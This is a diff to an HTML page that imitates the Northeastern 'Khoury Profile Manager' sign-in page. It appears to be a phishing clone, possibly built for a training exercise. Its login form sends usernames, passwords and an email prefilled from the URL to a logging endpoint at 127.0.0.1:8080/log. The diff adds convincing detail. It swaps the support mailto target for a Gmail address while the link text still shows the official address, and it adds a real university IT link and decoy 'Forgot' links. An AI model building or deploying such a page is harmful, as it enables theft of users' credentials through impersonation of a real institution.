@@ -6,7 +6,7 @@
     <title>Sign into Khoury Profile Manager</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: Aptos, sans-serif;
             margin: 0;
             padding: 0;
             background-color: #555;
@@ -75,17 +75,18 @@
             background-color: #333;
         }
         .footer {
-         text-align: center;
-         padding: 20px 0; /*padding */
-         background-color: #6e6e6e; /*background/
-         color: #ccc;
-         font-size: 12px;
-         width: 100%;
-         position: fixed;
-         bottom: 1;
-         left: 0;
-         border-top: 10px solid #555;
-         }
+            text-align: center;
+            padding: 20px 0;
+            background-color: #6e6e6e;
+            color: #ffffff;
+            font-size: 12px;
+            width: 100%;
+            position: fixed;
+            bottom: 1;
+            left: 0;
+            border-top: 10px solid #555;
+        }
+
     </style>
 </head>
 <body>
@@ -99,25 +100,53 @@
         invalidate account and password change requests.</p>
     <p>The creation of new accounts is based on enrollment data provided by the Registrar and is updated nightly. Newly
         enrolled students will be created the following day.</p>
-    <p>Please email <a href="mailto:khoury-systems@northeastern.edu">khoury-systems@northeastern.edu</a> if you haven't
+    <p>Please email <a href="mailto:csforeveryone.nu@gmail.com">khoury-systems@northeastern.edu</a> if you haven't
         received correspondence within half a day (and have checked your junk/spam folder) or if you encounter any
-        issues. You can also visit <a href="#">Khoury Information Technology</a> for links to our Knowledge Base.</p>
+        issues. You can also visit <a href="https://www.khoury.northeastern.edu/khoury-college-facilities/it/">Khoury Information Technology</a> for links to our Knowledge Base.</p>
 
-<!--     <form action="http://127.0.0.1:8080/log" method="POST">
-        <label for="username">Username</label>
-        <input type="text" id="username" name="username" placeholder="Enter your username" required>
-
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" placeholder="Enter your password" required>
-
-        <button type="submit">Login</button>
-    </form> -->
 <form action="http://127.0.0.1:8080/log" method="GET">
     <input type="hidden" name="email" id="emailField" value="">
-    <input type="text" name="username" placeholder="Username" required>
-    <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Login</button>
-</form>
+    <div class="input-container">
+            <label for="username">Username</label>
+            <a href="fail.html" class="forgot-link">Forgot Username</a>
+            <input type="text" id="username" name="username" placeholder required>
+        </div>
+
+        <div class="input-container">
+            <label for="password">Password</label>
+            <a href="fail.html" class="forgot-link">Forgot Password</a>
+            <input type="password" id="password" name="password" placeholder required>
+        </div>
+
+        <button type="submit">Login</button>
+    </form>
+
+    <style>
+        .input-container {
+            font-family: Aptos, sans-serif;
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .forgot-link {
+            position: absolute;
+            right: 0;
+            top: 0;
+            font-size: 14px;
+            color: #b11a1a !important;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .login-container label {
+            display: inline-block;
+            font-weight: bold;
+        }
+    </style>
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
@@ -126,6 +155,7 @@
         document.getElementById("emailField").value = email;
     }
 </script>
+
 </div>
 
 <div class="footer">
